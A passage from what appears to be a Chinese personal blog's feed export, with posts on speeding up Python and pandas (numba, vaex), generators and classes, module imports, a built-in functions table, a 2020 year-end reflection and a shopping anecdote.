      <url>/2021/python-faster-pandas-skills/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="numba-加速"><a href="#numba-加速" class="headerlink" title="numba 加速"></a>numba 加速</h1><p>原文链接：<a href="https://zhuanlan.zhihu.com/p/78882641">https://zhuanlan.zhihu.com/p/78882641</a><br>使用 numba 非常简单，只需要将 numba 装饰器应用到 python 函数中，无需改动原本的 python 代码，numba 会自动完成剩余的工作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> numba<br><span class="hljs-keyword">from</span> numba <span class="hljs-keyword">import</span> jit<br><span class="hljs-meta">@jit(nopython=True) # jit，numba装饰器中的一种</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">go_fast</span>(<span class="hljs-params">a</span>):</span> <span class="hljs-comment"># 首次调用时，函数被编译为机器代码</span><br>    trace = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># 假设输入变量是numpy数组</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(a.shape[<span class="hljs-number">0</span>]):   <span class="hljs-comment"># Numba 擅长处理循环</span><br>        trace += np.tanh(a[i, i])<br>    <span class="hljs-keyword">return</span> a + trace<br></code></pre></td></tr></table></figure><p>以上代码是一个 python 函数，用以计算 numpy 数组各个数值的双曲正切值，我们使用了 numba 装饰器，它将这个 python 函数编译为等效的机器代码，可以大大减少运行时间。</p><p>什么情况下使用 numba 呢？</p><ul><li><p>使用 numpy 数组做大量科学计算时</p></li><li><p>使用 for 循环时</p></li></ul><h1 id="Vaex-大数据"><a href="#Vaex-大数据" class="headerlink" title="Vaex-大数据"></a>Vaex-大数据</h1><p>pandas 能应付较大数据集（千万行级别），但当数据量达到十亿百亿行级别，pandas 处理起来就有点力不从心了，可以说非常的慢。<br>官网对 vaex 的介绍可以总结为三点：</p><ol><li>vaex 是一个用处理、展示数据的数据表工具，类似 pandas；</li><li>vaex 采取内存映射、惰性计算，不占用内存，适合处理大数据；</li><li>vaex 可以在百亿级数据集上进行秒级的统计分析和可视化展示；</li></ol><p>vaex 的优势在于：</p><ol><li>性能：处理海量数据，<img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1612452799902-870408e1-e8d4-4be6-8e01-4f210cfbfeb2.svg#align=left&display=inline&height=24&originHeight=24&originWidth=30&size=0&status=done&style=none&width=30"> 行/秒；</li><li>惰性：快速计算，不占用内存；</li><li>零内存复制：在进行过滤/转换/计算时，不复制内存，在需要时进行流式传输；</li><li>可视化：内含可视化组件；</li><li>API：类似 pandas，拥有丰富的数据处理和计算函数；</li><li>可交互：配合 Jupyter notebook 使用，灵活的交互可视化；</li></ol><p>vaex 支持读取 hdf5、csv、parquet 等文件，使用 read 方法。<strong>hdf5 可以惰性读取，而 csv 只能读到内存中。</strong></p><h2 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1612452873550-e4fe3496-3065-4574-a3c6-6166ea59be44.png#align=left&display=inline&height=238&name=image.png&originHeight=476&originWidth=1103&size=551802&status=done&style=none&width=551.5" alt="image.png"></p><h2 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a><strong>数据处理</strong></h2><p>有时候我们需要对数据进行各种各样的转换、筛选、计算等，pandas 的每一步处理都会消耗内存，而且时间成本高。除非说使用链式处理，但那样过程就很不清晰。<br>vaex 则全过程都是零内存。因为它的处理过程仅仅产生 expression（表达式），表达式是逻辑表示，不会执行，只有到了最后的生成结果阶段才会执行。而且整个过程数据是流式传输，不会产生内存积压。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1612452902398-16734510-bd92-4925-8e14-961e74d001a1.png#align=left&display=inline&height=390&name=image.png&originHeight=780&originWidth=850&size=291737&status=done&style=none&width=425" alt="image.png"></p><p>vaex 的统计计算函数：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1612452927524-0f9ecf6d-55a0-4cb3-a182-a6de89c1aa35.png#align=left&display=inline&height=327&name=image.png&originHeight=654&originWidth=1094&size=916957&status=done&style=none&width=547" alt="image.png"></p><h2 id="可视化展示"><a href="#可视化展示" class="headerlink" title="可视化展示"></a><strong>可视化展示</strong></h2><p>vaex 还可以进行快速可视化展示，即便是上百亿的数据集，依然能秒出图。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1612452949828-2ea30a17-ea3c-4304-ae12-da559d11a975.png#align=left&display=inline&height=321&name=image.png&originHeight=641&originWidth=767&size=819723&status=done&style=none&width=383.5" alt="image.png"><br>vaex 可视化函数：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1612452967955-3e04f041-55c6-419f-8d3c-2e4c4e1fa214.png#align=left&display=inline&height=195&name=image.png&originHeight=390&originWidth=1108&size=378518&status=done&style=none&width=554" alt="image.png"><br>附：hdf5 数据集生成代码（4 列 1 亿行数据）</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> vaex<br>df = pd.DataFrame(np.random.rand(<span class="hljs-number">100000000</span>,<span class="hljs-number">4</span>),<span class="hljs-keyword">columns</span>=[<span class="hljs-string">&#x27;col_1&#x27;</span>,<span class="hljs-string">&#x27;col_2&#x27;</span>,<span class="hljs-string">&#x27;col_3&#x27;</span>,<span class="hljs-string">&#x27;col_4&#x27;</span>])<br>df.to_csv(<span class="hljs-string">&#x27;example.csv&#x27;</span>,<span class="hljs-keyword">index</span>=<span class="hljs-keyword">False</span>)<br>vaex.<span class="hljs-keyword">read</span>(<span class="hljs-string">&#x27;example.csv&#x27;</span>,convert=<span class="hljs-string">&#x27;example1.hdf5&#x27;</span>)<br></code></pre></td></tr></table></figure><p>注意这里不要用 pandas 直接生成 hdf5，其格式会与 vaex 不兼容。</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> pandas </tag>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-ML-usefull-skills</title>
      <link href="/2020/Python-ML-usefull-skills/"/>
      <url>/2020/Python-ML-usefull-skills/</url>
      
        <content type="html"><![CDATA[<p>记录一下机器学习所要用到的 python 相关知识</p><a id="more"></a><h1 id="高性能-Pandas：eval-与-query"><a href="#高性能-Pandas：eval-与-query" class="headerlink" title="高性能 Pandas：eval()与 query()"></a>高性能 Pandas：eval()与 query()</h1><p>参考：<a href="https://github.com/jakevdp/PythonDataScienceHandbook/blob/master/notebooks/03.12-Performance-Eval-and-Query.ipynb">https://github.com/jakevdp/PythonDataScienceHandbook/blob/master/notebooks/03.12-Performance-Eval-and-Query.ipynb</a></p><h1 id="三维绘图"><a href="#三维绘图" class="headerlink" title="三维绘图"></a>三维绘图</h1><p>参考：<a href="https://github.com/jakevdp/PythonDataScienceHandbook/blob/master/notebooks/04.12-Three-Dimensional-Plotting.ipynb">https://github.com/jakevdp/PythonDataScienceHandbook/blob/master/notebooks/04.12-Three-Dimensional-Plotting.ipynb</a></p><h1 id="可视化-error-残差"><a href="#可视化-error-残差" class="headerlink" title="可视化 error 残差"></a>可视化 error 残差</h1><p>参考：<a href="https://github.com/jakevdp/PythonDataScienceHandbook/blob/master/notebooks/04.03-Errorbars.ipynb">可视化异常处理</a></p><h1 id="向量化字符串操作"><a href="#向量化字符串操作" class="headerlink" title="向量化字符串操作"></a>向量化字符串操作</h1><p>参考：<a href="https://github.com/jakevdp/PythonDataScienceHandbook/blob/master/notebooks/03.10-Working-With-Strings.ipynb">https://github.com/jakevdp/PythonDataScienceHandbook/blob/master/notebooks/03.10-Working-With-Strings.ipynb</a></p><h1 id="数组计算：广播"><a href="#数组计算：广播" class="headerlink" title="数组计算：广播"></a>数组计算：广播</h1><p>参考：<a href="https://github.com/jakevdp/PythonDataScienceHandbook/blob/master/notebooks/02.05-Computation-on-arrays-broadcasting.ipynb">https://github.com/jakevdp/PythonDataScienceHandbook/blob/master/notebooks/02.05-Computation-on-arrays-broadcasting.ipynb</a></p>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> Machine Learning </tag>
            
            <tag> pandas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-year-end-summary</title>
      <link href="/2020/2020-year-end-summary/"/>
      <url>/2020/2020-year-end-summary/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>写下这篇 2020 年终总结的时候，是 11 月 30 号，距离 2020 年结束还有 31 天。</p><p>我坐在 C 楼的教室里，仍然是听着歌，准备写一些今年的所感所想。</p><p>今天天气多云，气温很低，还好教室人不是很多。</p><h1 id="魔幻的一年"><a href="#魔幻的一年" class="headerlink" title="魔幻的一年"></a>魔幻的一年</h1><p>去年跨年的时候，我们在调侃要被当作贫困人口而被消灭了，然而新冠疫情突然爆发，打得所有人措手不及。</p><p>今年跨年，我估计大家都是希望活着就好，愈发的感受到了身体的重要，平安喜乐，身体康健，真的是对一个人最大的祝福了。</p><p>昨天晚上，点开了去年的 blog，把 2018 年和 2019 年的年终总结又读了一遍，感慨良多。</p><p>这一年，物是人非。</p><p>我只是在这个时代下被社会洪流裹挟的一个普通个体，平平淡淡，默默无闻。永远保持谦卑，永远相信人外有人，及时的跳出安逸圈鞭打自己。</p><h1 id="时间线-📆"><a href="#时间线-📆" class="headerlink" title="时间线 📆"></a>时间线 📆</h1><ul><li><p>2020-01</p><ul><li>回高中看老师+尴尬的宣讲（把我们学校和一群文科学校分在一起）</li></ul></li><li><p>2020-02</p><ul><li>美赛+分手</li></ul></li><li><p>2020-03</p><ul><li>线上学期开始，惶惶不可终日</li></ul></li><li><p>2020-04</p><ul><li>美赛 M 奖+加入科研组+信安作品赛</li></ul></li><li><p>2020-05</p><ul><li>校赛一等奖+开始读论文</li></ul></li><li><p>2020-06</p><ul><li>互联网+校赛金奖，忙着复习（补天）+大作业</li></ul></li><li><p>2020-07</p><ul><li>疯狂复习+无数的大作业</li></ul></li><li><p>2020-08</p><ul><li>返校考试，开学</li></ul></li><li><p>2020-09</p><ul><li>互联网+省赛金奖+校一等奖学金</li></ul></li><li><p>2020-10</p><ul><li>十月下了很长时间的雨</li><li>国家奖学金 get+科研</li></ul></li><li><p>2020-11</p><ul><li>复习+写作业+高党+开会+评议+一堆事<blockquote><p>今天预备党员名单也出了，意料之中，我没有成为本批次的发展对象。<br>岂能尽如人意，但求无愧我心。</p></blockquote></li></ul></li><li><p>2020-12</p><ul><li>大作业+复习+考试</li></ul></li></ul><h1 id="写给自己-💬"><a href="#写给自己-💬" class="headerlink" title="写给自己 💬"></a>写给自己 💬</h1><p>本科生活已经过半，未来的路还不知通向何方。</p><p>但我将永远记得——</p><p><strong>我深知自己并非美玉，故而不敢抛光争辉，</strong></p><p><strong>却又坚信自己通过付出，可以成为美玉，</strong></p><p><strong>故而不肯流于外在，与庸碌一生。</strong></p><p><strong>我不知道命运会把我带向何方，但是我一直会用善良维护左右。</strong></p><p>是的，我坚信冥冥之中的一切，命运自有安排。我现在需要做的，就是提升自己，充实自己，丰富自己，像陈年的美酒一样，经历时间的打磨和淬炼，去拥抱未知的变数。</p><p>我相信，相逢的人会再重逢，迷失的人会再迷失。</p><h1 id="警醒自己-❗"><a href="#警醒自己-❗" class="headerlink" title="警醒自己 ❗"></a>警醒自己 ❗</h1><p><strong>吃不了自律的苦，就要受平庸的罪。</strong></p><p>不要跟我说什么早起效率低，你为什么不能早睡？</p><blockquote><p>您记住了，千古以来，要饭的，没有要早饭的<br>为什么呢？<br>因为，他能早起就不至于要饭。<br>—郭德纲</p></blockquote><h1 id="2021-共勉-💖"><a href="#2021-共勉-💖" class="headerlink" title="2021 共勉 💖"></a>2021 共勉 💖</h1><p><font face="楷体" font-size="19px">不是所有坚持都有结果，但是总有一些坚持，能从一寸冰封的土地里，培育出十万朵怒放的蔷薇。</font></p><p><font face="楷体" font-size="19px">少年从黑暗中来，却满目星辰毫无戾气，风尘仆仆又温柔至极。</font></p><p><font face="楷体" font-size="19px">希望你有皮鞋也有跑鞋，喝茶也喝酒。</font></p><p><font face="楷体" font-size="19px">希望你有勇敢的朋友，有牛逼的对手；</font></p><p><font face="楷体" font-size="19px">希望你对过往一切情深意重但从不回头。</font></p><p><font face="楷体" font-size="19px">希望你对想要的未来抵死执着但当下却无紧迫神色。</font></p><p><font face="楷体" font-size="19px">希望你特别飒，特别敢，特别温柔特别狠。</font></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 年终总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Interesting-Things</title>
      <link href="/2020/Interesting-Things/"/>
      <url>/2020/Interesting-Things/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>宜家真是太厚道了……我之前买了个家具 3600，放在那边一直没装，现在调价 2800 了……我觉得好不爽，但是也认了……<br>结果和店员吐槽这个事情，店员说半年可退换啊，你直接拿来退就好。我说算了，好大个东西，搬来搬去太麻烦。<br>结果店员说你以前发票还在不在？在的话你下次带来再买一个新的，然后用过去的发票来我这退新的就好，卧槽，好机智。<br>回帖：这个思路我用过，之前淘宝买衣服，尺码不合适，偏偏没买运费险。我就和客服说好，又买了尺码合适的，这回买运费险，收货后把第一件退回去。双方都皆大欢喜。</p><blockquote><p>作者：莞尔<br>链接：<a href="https://www.zhihu.com/question/431045341/answer/1593782118">https://www.zhihu.com/question/431045341/answer/1593782118</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p></blockquote><h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1606563381983-7046ad19-d8bb-4524-8f54-98bfcd00137d.png#align=left&display=inline&height=135&name=image.png&originHeight=201&originWidth=677&size=161800&status=done&style=none&width=456" alt="image.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 生活 </tag>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tricks-in-python</title>
      <link href="/2020/Tricks-in-python/"/>
      <url>/2020/Tricks-in-python/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="装饰器-classmethod-和-staticmethod"><a href="#装饰器-classmethod-和-staticmethod" class="headerlink" title="装饰器-@classmethod 和@staticmethod"></a>装饰器-@classmethod 和@staticmethod</h1><p>将方法定义成类方法和静态方法。</p><p><a href="https://zhuanlan.zhihu.com/p/28010894">https://zhuanlan.zhihu.com/p/28010894</a><br>可以看看这篇文章</p><h1 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h1><h2 id="通过函数方式创建"><a href="#通过函数方式创建" class="headerlink" title="通过函数方式创建"></a>通过函数方式创建</h2><p>通过<code>yield</code>关键字将一个函数变成<code>generator</code>。例如：<br>函数的定义：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fib</span>(<span class="hljs-params">max</span>):</span><br>    n, a, b = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> n &lt; max:<br>        print(b)<br>        a, b = b, a + b<br>        n = n + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;done&#x27;</span><br></code></pre></td></tr></table></figure><p>生成器的定义：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fib</span>(<span class="hljs-params">max</span>):</span><br>    n, a, b = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> n &lt; max:<br>        <span class="hljs-keyword">yield</span> b<br>        a, b = b, a + b<br>        n = n + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;done&#x27;</span><br></code></pre></td></tr></table></figure><p>两者的差别在于生成器将函数的<code>print(b)</code>改为<code>yield b</code>。<code>yield</code>可以翻译为<code>生成</code>，即基于某次计算生成某个元素，而不是提前存储了该元素。<br>函数式的<code>generator</code>一般采用<code>for</code>循环来获取元素，也可以通过<code>next()</code>来获取下一个元素的值，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> fib(<span class="hljs-number">6</span>):<br><span class="hljs-meta">... </span>    print(n)<br>...<br><span class="hljs-number">1</span><br><span class="hljs-number">1</span><br><span class="hljs-number">2</span><br><span class="hljs-number">3</span><br><span class="hljs-number">5</span><br><span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>如果要获取<code>return</code>的内容，可以捕获<code>StopIteration</code>错误，返回值包含在<code>StopIteration</code>的<code>value</code>中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>g = fib(<span class="hljs-number">6</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">try</span>:<br><span class="hljs-meta">... </span>        x = next(g)<br><span class="hljs-meta">... </span>        print(<span class="hljs-string">&#x27;g:&#x27;</span>, x)<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">except</span> StopIteration <span class="hljs-keyword">as</span> e:<br><span class="hljs-meta">... </span>        print(<span class="hljs-string">&#x27;Generator return value:&#x27;</span>, e.value)<br><span class="hljs-meta">... </span>        <span class="hljs-keyword">break</span><br>...<br>g: <span class="hljs-number">1</span><br>g: <span class="hljs-number">1</span><br>g: <span class="hljs-number">2</span><br>g: <span class="hljs-number">3</span><br>g: <span class="hljs-number">5</span><br>g: <span class="hljs-number">8</span><br>Generator <span class="hljs-keyword">return</span> value: done<br></code></pre></td></tr></table></figure><h1 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h1><h2 id="访问限制"><a href="#访问限制" class="headerlink" title="访问限制"></a>访问限制</h2><p>实例的变量以<code>__xxx</code>双下划线开头，没有以<code>__</code>双下划线结尾的，则该变量为私有变量，外部一般无法访问。例如：<code>self.__name = name</code>。<br>如果变量名是双下划线开头、双下划线结尾，<code>__xxx__</code>是特殊变量而不是私有变量。私有变量的方式可以避免外部对实例内部数据的修改，可以做参数检查。<br>如果需要获取或修改内部的数据，可以增加<code>get</code>和<code>set</code>的方法。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span>(<span class="hljs-params">object</span>):</span><br>    <span class="hljs-comment">#构造函数</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, name, score</span>):</span><br>        self.__name = name<br>        self.__score = score<br>    <span class="hljs-comment">#get方法</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_name</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> self.__name<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_score</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> self.__score<br>     <span class="hljs-comment">#set方法</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set_score</span>(<span class="hljs-params">self, score</span>):</span><br>        <span class="hljs-comment">#参数检查</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= score &lt;= <span class="hljs-number">100</span>:<br>            self.__score = score<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&#x27;bad score&#x27;</span>)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugs-in-python</title>
      <link href="/2020/Bugs-in-python/"/>
      <url>/2020/Bugs-in-python/</url>
      
        <content type="html"><![CDATA[<p>记录在编写 python 程序中遇到的 bug 们。</p><a id="more"></a><h1 id="跨目录调用模块"><a href="#跨目录调用模块" class="headerlink" title="跨目录调用模块"></a>跨目录调用模块</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">project</span><br>├── <span class="hljs-selector-tag">package1</span><br>│   ├── __<span class="hljs-selector-tag">init__</span><span class="hljs-selector-class">.py</span><br>│   ├── <span class="hljs-selector-tag">module_11</span><span class="hljs-selector-class">.py</span><br>│   └── <span class="hljs-selector-tag">module_12</span><span class="hljs-selector-class">.py</span><br>├── <span class="hljs-selector-tag">package2</span><br>│   ├── __<span class="hljs-selector-tag">init_</span><span class="hljs-selector-class">.py</span><br>│   ├── <span class="hljs-selector-tag">module_21</span><span class="hljs-selector-class">.py</span><br>│   └── <span class="hljs-selector-tag">module_22</span><span class="hljs-selector-class">.py</span><br>├── <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.py</span><br>└── <span class="hljs-selector-tag">tool</span><span class="hljs-selector-class">.py</span><br></code></pre></td></tr></table></figure><p>对于这样一个目录结构的项目，我们需要知道：<br>Python 解析器对<strong>模块位置的搜索顺序</strong>：</p><ol><li><strong>当前目录</strong>。</li><li>PYTHONPATH 的每个目录。</li><li>查看 Python 安装时的默认包路径。例如：<code>/usr/lib64/python2.6/site-packages</code>。<blockquote><p>可以通过查询<code>sys.path</code>查看模块搜索路径。</p></blockquote></li></ol><h2 id="在子包（package-中引入根目录"><a href="#在子包（package-中引入根目录" class="headerlink" title="在子包（package)中引入根目录"></a>在子包（package)中引入根目录</h2><ul><li><p>将项目的根目录加到 PYTHONPATH 变量中</p></li><li><p>sys.path.append(“..”)</p></li></ul><h2 id="同级模块（module）引用"><a href="#同级模块（module）引用" class="headerlink" title="同级模块（module）引用"></a>同级模块（module）引用</h2><p><code>module_11.py</code>文件导入 module_12.py 模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> module_12<br></code></pre></td></tr></table></figure><h2 id="导入下级模块"><a href="#导入下级模块" class="headerlink" title="导入下级模块"></a>导入下级模块</h2><p><code>main.py</code>文件导入<code>module_12.py</code>模块</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> package<span class="hljs-number">1</span> import module_<span class="hljs-number">12</span><br><span class="hljs-comment"># 或者</span><br><span class="hljs-attribute">import</span> package<span class="hljs-number">1</span>.module_<span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><h2 id="导入上级模块"><a href="#导入上级模块" class="headerlink" title="  导入上级模块"></a>  导入上级模块</h2><p><code>module_11.py</code>导入上级目录的<code>tool.py</code>模块</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-keyword">import</span> sys<br>sys.<span class="hljs-built_in">path</span>.append(<span class="hljs-string">&quot;..&quot;</span>)<br><span class="hljs-keyword">import</span> tool<br></code></pre></td></tr></table></figure><p>相当于通过<code>sys.path.append(&quot;..&quot;)</code>进入上级目录，然后类似导入<code>同级目录</code>模块的方式导入。</p><h2 id="导入跨包下级模块"><a href="#导入跨包下级模块" class="headerlink" title="导入跨包下级模块"></a>导入跨包下级模块</h2><p><code>module_11.py</code>导入<code>package2</code>包的<code>module_21.py</code>模块</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-keyword">import</span> sys<br>sys.<span class="hljs-built_in">path</span>.append(<span class="hljs-string">&quot;..&quot;</span>)<br>from package2 <span class="hljs-keyword">import</span> module_21<br></code></pre></td></tr></table></figure><p>相当于通过<code>sys.path.append(&quot;..&quot;)</code>进入上级目录，然后类似导入<code>下级目录</code>模块的方式导入。</p><blockquote><p>参考：<a href="https://www.huweihuang.com/python-notes/package/package-module.html">https://www.huweihuang.com/python-notes/package/package-module.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python-useful-skills</title>
      <link href="/2020/python-useful-skills/"/>
      <url>/2020/python-useful-skills/</url>
      
        <content type="html"><![CDATA[<p>一些好用的 python 内置属性、函数、技巧。</p><a id="more"></a><h1 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h1><table><thead><tr><th>Built-in Functions</th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td><a href="https://docs.python.org/3/library/functions.html#abs"><code>abs()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#func-dict"><code>dict()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#help"><code>help()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#min"><code>min()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#setattr"><code>setattr()</code></a></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#all"><code>all()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#dir"><code>dir()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#hex"><code>hex()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#next"><code>next()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#slice"><code>slice()</code></a></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#any"><code>any()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#divmod"><code>divmod()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#id"><code>id()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#object"><code>object()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#sorted"><code>sorted()</code></a></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#ascii"><code>ascii()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#enumerate"><code>enumerate()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#input"><code>input()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#oct"><code>oct()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#staticmethod"><code>staticmethod()</code></a></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#bin"><code>bin()</code></a></td><td><code>[eval()](https://docs.python.org/3/library/functions.html#eval)--执行字符串命令</code></td><td><a href="https://docs.python.org/3/library/functions.html#int"><code>int()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#open"><code>open()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#func-str"><code>str()</code></a></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#bool"><code>bool()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#exec"><code>exec()</code></a></td><td><a 